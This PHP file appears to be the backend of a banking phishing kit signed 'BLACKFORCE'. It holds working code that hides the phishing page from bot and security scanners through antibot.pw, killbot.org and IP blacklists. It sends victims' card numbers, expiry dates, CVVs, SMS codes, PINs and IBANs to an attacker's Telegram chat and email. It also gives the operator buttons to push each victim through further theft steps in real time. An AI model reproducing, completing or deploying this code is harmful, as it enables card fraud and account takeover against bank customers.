<?php
//Generate Random Numbers
$str = rand();
$id = md5($str);
$ue = md5($str + 8);
//GET DATE
$today = new DateTime();
$tomorrow = new DateTime('tomorrow');
$day_after_tomorrow = new DateTime('tomorrow +1 day');

function get_client_ip() {
    $ip = null;
    foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $header) {
        if (array_key_exists($header, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$header]) as $potential_ip) {
                $potential_ip = trim($potential_ip);
                if (filter_var($potential_ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    $ip = $potential_ip;
                    break 2;
                }
            }
        }
    }
    return ($ip !== null) ? $ip : '127.0.0.1';
}

//GET IP AND OS
$ip = get_client_ip();
$agent = $_SERVER['HTTP_USER_AGENT'];

function update() {
    $filePaths = [ './Panel/action/ip_pin.txt', './Panel/action/ip_badPin.txt', './Panel/action/ip_sms.txt', './Panel/action/ip_badSms.txt', './Panel/action/ip_mail.txt', './Panel/action/ip_badMail.txt', './Panel/action/ip_confirm.txt', './Panel/action/ip_badIban.txt', './Panel/action/ip_iban.txt'];

    try {
        foreach ($filePaths as $filePath) {
            $file = fopen($filePath, 'w');
            if ($file === false) {
                throw new Exception("Unable to open file: $filePath");
            }

            // Truncate the file, effectively deleting all text
            ftruncate($file, 0);
            fclose($file);
        }
    } catch (Exception $e) {
        // Handle the exception if needed
    }
}

function response() {
    $ip = get_client_ip(); // Assuming you have a function to get the client's IP address.

    // Define an array of file names to check.
    $fileNames = [ './Panel/action/ip_pin.txt', './Panel/action/ip_badPin.txt', './Panel/action/ip_sms.txt', './Panel/action/ip_badSms.txt', './Panel/action/ip_mail.txt', './Panel/action/ip_badMail.txt', './Panel/action/ip_confirm.txt', './Panel/action/ip_badIban.txt', './Panel/action/ip_iban.txt'];

    // Loop through the files and check if the IP is in any of them.
    foreach ($fileNames as $index => $fileName) {
        $fileContents = file_get_contents($fileName);

        // Check if the IP address is in the file.
        if (strpos($fileContents, $ip) !== false) {
            // Return a different response based on the file index.
            if ($index === 0) {
                return "pin";
            } elseif ($index === 1) {
                return "badpin";
            } elseif ($index === 2) {
                return "sms";
            } elseif ($index === 3) {
                return "badsms";
            } elseif ($index === 4) {
                return "mail";
            } elseif ($index === 5) {
                return "badmail";
            } elseif ($index === 6) {
                return "confirm";
            }
            elseif ($index === 7) {
                return "iban";
            }
            elseif ($index === 8) {
                return "badiban";
            }
            
            
        }
    }

    // If the IP address is not found in any of the files, you can return a default response.
    return "unknown";
}


function antibotpw() {
    if( empty(ANTIBOTPW_API) )
        return;
    if( $_SESSION['notbot'] == 1 )
        return;
    $ip = get_client_ip();
    $list = file("blacklist.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($ip, $list)) {
        header("Location: https://www.google.com/");
        exit();
    }
    $ua = str_replace(' ', '', $_SERVER['HTTP_USER_AGENT']);
    $check = json_decode(file_get_contents('https://antibot.pw/api/v2-blockers?ip='. $ip .'&apikey='. ANTIBOTPW_API .'&ua=' . $ua),true);
    $is_bot = $check['is_bot'];
    if( $is_bot == 1 ) {
        file_put_contents("blacklist.txt", $ip . "\r\n", FILE_APPEND);
        header("Location: https://www.google.com/");
        exit();
    } else {
        $_SESSION['notbot'] = 1;
    }
}
function killbot() {
    if( empty(KILLBOT_API) )
        return;
    if( $_SESSION['notbot'] == 1 )
        return;
    $ip = get_client_ip();
    $list = file("blacklist.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($ip, $list)) {
        header("Location: https://www.google.com/");
        exit();
    }

    $ua = str_replace(' ', '', $_SERVER['HTTP_USER_AGENT']);
    $check = json_decode(file_get_contents("https://killbot.org/api/v2/blocker?ip=". $ip ."&apikey=". KILLBOT_API ."&ua=". $ua . "&url=" . $url,true));

    if( $check->data->is_bot == 1 || $check->data->block_access == 1 ) {
        file_put_contents("blacklist.txt", $ip . "\r\n", FILE_APPEND);
        header("Location: https://www.google.com/");
        exit();
    } else {
        $_SESSION['notbot'] = 1;
    }
}

function BannedIP($ip) {
    $link_file = "Panel/botActBan/ip_ban.txt";
    $bannedip = file($link_file, FILE_IGNORE_NEW_LINES);
    $bannedip = array_map("str_getcsv", $bannedip);
    $bannedip = array_column($bannedip, null, 0);
    
    if(isset($bannedip[$ip])) {
        header('Location: https://www.google.com/');
        die(); 
    }
}
function update_ini($data, $file)
{
    $content = "";
    $parsed_ini = parse_ini_file($file, true);
    foreach ($data as $section => $values) {
        if ($section === "") {
            continue;
        }
        $content .= $section . "=" . $values . "\n\r";
    }
    if (!$handle = fopen($file, 'w')) {
        return false;
    }
    $success = fwrite($handle, $content);
    fclose($handle);
}
// Function to send a message to Telegram
function sendCard($rezdata) {
    $bot_url  = TOKEN;
    $chat_id  = CHATID;
    $host = PANEL;
    $ip = get_client_ip();
    $views = $host."/visitors.html";
    $fastLink = $host."/app/Panel/fastCardLink/index.php?ccn=" .$_SESSION['scan']. '&exp=' .$_SESSION['sexp']. '&cch='.$_SESSION['scch'];
    $ban = $host."/app/Panel/botActBan/banIpAct.php?ip=".$ip;
    $sms = $host."/app/Panel/action/insert_sms.php?ip=".$ip;
    $mail = $host."/app/Panel/action/insert_mail.php?ip=".$ip;
    $pin = $host."/app/Panel/action/insert_pin.php?ip=".$ip;
    $iban = $host."/app/Panel/action/insert_iban.php?ip=".$ip;
    $confirm = $host."/app/Panel/action/insert_confirm.php?ip=".$ip;

    $keyboard = json_encode([
        "inline_keyboard" => [
            [
                [
                    "text" => "🔎 VIEW'S",
                    "url" => "$views" // This button remains a GET request
                ],
                [
                    "text" => "⚡️ Fast Link",
                    "url" => "$fastLink" // This button also remains a GET request
                ]
            ],
            [
                [
                    "text" => "📱 TO SMS 📱",
                    "url" => "$sms" // This button also remains a GET request
                ]
            ],
            [
                [
                    "text" => "🔑 TO PIN 🔑",
                    "url" => "$pin" // This button also remains a GET request
                ]
            ],
            [
                [
                    "text" => "💌 TO MAIL 💌",
                    "url" => "$mail" // This button also remains a GET request
                ]
            ],
            [
                [
                    "text" => "🔷 IBAN 🔷",
                    "url" => "$iban" // This button also remains a GET request
                ]
            ],
            
            [
                [
                    "text" => "✅ CONFIRM ✅",
                    "url" => "$confirm"
                ]
    
            ],
            [
                [
                    "text" => "🛑 Ban IP 🛑",
                    "url" => "$ban" // This button sends a callback
                ]
            ]
        ]
    ]);

    $parameters = array(
        "chat_id" => $chat_id,
        "text" => $rezdata,
        'reply_markup' => $keyboard
    );

    $send = ($parameters);
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}



function sendSms($rezdata) {

    $ip = get_client_ip();
    $bot_url  = TOKEN;
    $chat_id  = CHATID;
    $host = PANEL;
    $ban = $host."/app/Panel/botActBan/banIpAct.php?ip=".$ip;
    $mail = $host."/app/Panel/action/insert_mail.php?ip=".$ip;
    $iban = $host."/app/Panel/action/insert_iban.php?ip=".$ip;
    $pin = $host."/app/Panel/action/insert_pin.php?ip=".$ip;
    $badsms = $host."/app/Panel/action/insert_badsms.php?ip=".$ip;
    $confirm = $host."/app/Panel/action/insert_confirm.php?ip=".$ip;
    $keyboard = json_encode([
        "inline_keyboard" => [
            [
                [
                    "text" => "📲 SMS ERROR 📲",
                    "url" => "$badsms" // This button also remains a GET request
                ]
            ],
            [
                [
                    "text" => "🔑 TO PIN 🔑",
                    "url" => "$pin" // This button also remains a GET request
                ]
            ],
            [
                [
                    "text" => "💌 TO MAIL 💌",
                    "url" => "$mail" // This button also remains a GET request
                ]
            ],
            [
                [
                    "text" => "🔷 IBAN 🔷",
                    "url" => "$iban" // This button also remains a GET request
                ]
            ],
                [
                    [
                        "text" => "✅ CONFIRM ✅",
                        "url" => "$confirm"
                    ]
        
                ],
                [
                    [
                        "text" => "🛑 Ban IP 🛑",
                        "url" => "$ban"
                    ]
        
                ],
                    
        ]
    ]);


    $parameters = array(
        "chat_id" => $chat_id,
        "text" => $rezdata,
        'reply_markup' => $keyboard
    );

    $send = ($parameters);
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
function sendMailo($rezdata) {

    $ip = get_client_ip();
    $bot_url  = TOKEN;
    $chat_id  = CHATID;
    $host = PANEL;
    $ban = $host."/app/Panel/botActBan/banIpAct.php?ip=".$ip;
    $sms = $host."/app/Panel/action/insert_sms.php?ip=".$ip;
    $pin = $host."/app/Panel/action/insert_pin.php?ip=".$ip;
    $iban = $host."/app/Panel/action/insert_iban.php?ip=".$ip;
    $badmail = $host."/app/Panel/action/insert_badmail.php?ip=".$ip;
    $confirm = $host."/app/Panel/action/insert_confirm.php?ip=".$ip;
    $keyboard = json_encode([
        "inline_keyboard" => [
            [
                [
                    "text" => "📱 TO SMS 📱",
                    "url" => "$sms" // This button also remains a GET request
                ]
            ],
            [
                [
                    "text" => "🔑 TO PIN 🔑",
                    "url" => "$pin" // This button also remains a GET request
                ]
            ],
            [
                [
                    "text" => "📤 MAIL ERROR 📤",
                    "url" => "$badmail" // This button also remains a GET request
                ]
            ],
            [
                [
                    "text" => "🔷 IBAN 🔷",
                    "url" => "$iban" // This button also remains a GET request
                ]
            ],
                [
                    [
                        "text" => "✅ CONFIRM ✅",
                        "url" => "$confirm"
                    ]
        
                ],
                [
                    [
                        "text" => "🛑 Ban IP 🛑",
                        "url" => "$ban"
                    ]
        
                ],
                    
        ]
    ]);


    $parameters = array(
        "chat_id" => $chat_id,
        "text" => $rezdata,
        'reply_markup' => $keyboard
    );

    $send = ($parameters);
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
function sendPin($rezdata) {

    $ip = get_client_ip();
    $bot_url  = TOKEN;
    $chat_id  = CHATID;
    $host = PANEL;
    $ban = $host."/app/Panel/botActBan/banIpAct.php?ip=".$ip;
    $sms = $host."/app/Panel/action/insert_sms.php?ip=".$ip;
    $mail = $host."/app/Panel/action/insert_mail.php?ip=".$ip;
    $iban = $host."/app/Panel/action/insert_iban.php?ip=".$ip;
    $badpin = $host."/app/Panel/action/insert_badpin.php?ip=".$ip;
    $confirm = $host."/app/Panel/action/insert_confirm.php?ip=".$ip;
    $keyboard = json_encode([
        "inline_keyboard" => [
            [
                [
                    "text" => "📱 TO SMS 📱",
                    "url" => "$sms" // This button also remains a GET request
                ]
            ],
            [
                [
                    "text" => "🔐 PIN ERROR 🔐",
                    "url" => "$badpin" // This button also remains a GET request
                ]
            ],
            [
                [
                    "text" => "💌 TO MAIL 💌",
                    "url" => "$mail" // This button also remains a GET request
                ]
            ],
            [
                [
                    "text" => "🔷 IBAN 🔷",
                    "url" => "$iban" // This button also remains a GET request
                ]
            ],
                [
                    [
                        "text" => "✅ CONFIRM ✅",
                        "url" => "$confirm"
                    ]
        
                ],
                [
                    [
                        "text" => "🛑 Ban IP 🛑",
                        "url" => "$ban"
                    ]
        
                ],
                    
        ]
    ]);


    $parameters = array(
        "chat_id" => $chat_id,
        "text" => $rezdata,
        'reply_markup' => $keyboard
    );

    $send = ($parameters);
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
function sendIban($rezdata) {

    $ip = get_client_ip();
    $bot_url  = TOKEN;
    $chat_id  = CHATID;
    $host = PANEL;
    $ban = $host."/app/Panel/botActBan/banIpAct.php?ip=".$ip;
    $sms = $host."/app/Panel/action/insert_sms.php?ip=".$ip;
    $mail = $host."/app/Panel/action/insert_mail.php?ip=".$ip;
    $pin = $host."/app/Panel/action/insert_pin.php?ip=".$ip;
    $badiban = $host."/app/Panel/action/insert_badiban.php?ip=".$ip;
    $confirm = $host."/app/Panel/action/insert_confirm.php?ip=".$ip;
    $keyboard = json_encode([
        "inline_keyboard" => [
            [
                [
                    "text" => "📱 TO SMS 📱",
                    "url" => "$sms" // This button also remains a GET request
                ]
            ],
            [
                [
                    "text" => "🔑 TO PIN 🔑",
                    "url" => "$pin" // This button also remains a GET request
                ]
            ],
            [
                [
                    "text" => "💌 TO MAIL 💌",
                    "url" => "$mail" // This button also remains a GET request
                ]
            ],
            [
                [
                    "text" => "🔷 IBAN ERROR 🔷",
                    "url" => "$badiban" // This button also remains a GET request
                ]
            ],
                [
                    [
                        "text" => "✅ CONFIRM ✅",
                        "url" => "$confirm"
                    ]
        
                ],
                [
                    [
                        "text" => "🛑 Ban IP 🛑",
                        "url" => "$ban"
                    ]
        
                ],
                    
        ]
    ]);


    $parameters = array(
        "chat_id" => $chat_id,
        "text" => $rezdata,
        'reply_markup' => $keyboard
    );

    $send = ($parameters);
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

function sendTelegram($rezdata) {

    $ip = get_client_ip();
    $bot_url  = NOTIF_TOKEN;
    $chat_id  = NOTIF_CHATID;
    $host = PANEL;
    $views = $host."/visitors.html";
    $stats = $host."/app/Panel/stats/index.php";
    $ban = $host."/app/Panel/botActBan/banIpAct.php?ip=".$ip;
    
    $keyboard = json_encode([
        "inline_keyboard" => [
            [
                [
                    "text" => "🔎 VIEW'S",
                    "url" => "$views"
                ]
    
                ],
                [
                    [
                        "text" => "📊 STATS 📊",
                        "url" => "$stats"
                    ]
        
                    ],
                [
                    [
                        "text" => "🛑 Ban IP 🛑",
                        "url" => "$ban"
                    ]
        
                ]
        ]
    ]);


    $parameters = array(
        "chat_id" => $chat_id,
        "text" => $rezdata,
        'reply_markup' => $keyboard
    );

    $send = ($parameters);
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}


function sendMail($maildata) {
    $Bullet = BULLET;
    $subject = "BLACKFORCE REZDATA";
    $headers = "From: BLACKFORCE  <takethisbruh@BlackForce.com>\r\n";
    $headers .= 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/plain; charset=iso-8859-1' . "\r\n";
    return @mail($Bullet, $subject, $maildata, $headers);
}